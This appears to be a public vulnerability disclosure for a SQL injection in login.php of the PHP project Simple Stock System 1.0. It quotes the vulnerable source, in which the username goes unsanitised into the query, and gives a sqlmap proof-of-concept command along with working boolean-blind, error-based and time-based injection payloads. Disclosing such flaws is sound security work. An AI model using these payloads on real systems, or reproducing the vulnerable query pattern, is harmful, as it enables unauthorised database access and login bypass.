# SQLi in code-projects Simple Stock System 1.0 of file /login.php

**vender**:

- https://code-projects.org/simple-stock-system-in-php-with-source-code/

**SoftLink**:

- https://download.code-projects.org/details/e963d237-2367-4f52-92f3-dcadfee44bae

**Vulnerable File**

- /login.php

**Version**

- V1.0

**Description**

A vulnerability was found in code-projects Simple Stock System 1.0. Impacted is an unknown function of the file /login.php. The manipulation of the argument uname results in sql injection. The attack can be executed remotely. The exploit has been made public and could be used.

### Analyse

```php
<?php
session_start();

require('conn.php');
$username=$_POST['username'];
$pass=SHA1($_POST['password']);

$query="select * from users where username='$username'";
$res=mysqli_query($dbconn,$query) or die('error in query');
$row=mysqli_fetch_array($res);

if($row['password']==$pass){
	$_SESSION['uname']=$username;
	$_SESSION['email']=$row['email'];
	
	header('Location:portfolio.php');
}
else{
echo 'Incorrect username or password. Pls try again.';
session_destroy();

}
?>
```

### POC

```bash
 sqlmap -u "http://192.168.93.1/market/login.php" --data="username=admin&password=admin" --level=2 --thread=10 --batch
```

```bash
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 2150=(SELECT (CASE WHEN (2150=2150) THEN 2150 ELSE (SELECT 3021 UNION SELECT 3829) END))-- fmZu&password=admin

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 1040 FROM(SELECT COUNT(*),CONCAT(0x7178717871,(SELECT (ELT(1040=1040,1))),0x7178716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP
BY x)a) AND 'kBzN'='kBzN&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3329 FROM (SELECT(SLEEP(5)))yJtd) AND 'rqlN'='rqlN&password=admin
---
```

